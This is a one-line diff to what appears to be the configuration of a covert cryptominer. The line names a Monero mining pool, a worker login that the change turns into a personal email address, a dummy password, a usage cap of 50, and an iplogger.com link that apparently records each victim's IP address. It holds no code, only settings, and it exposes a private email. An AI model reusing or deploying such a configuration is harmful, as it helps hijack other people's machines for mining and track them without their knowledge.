@@ -1,1 +1,1 @@
-xmr.pool.minergate.com:45700;alexander-fesenko98;x;50;https://iplogger.com/1yR347;
+xmr.pool.minergate.com:45700;alexander-fesenko98@yandex.ru;x;50;https://iplogger.com/1yR347;
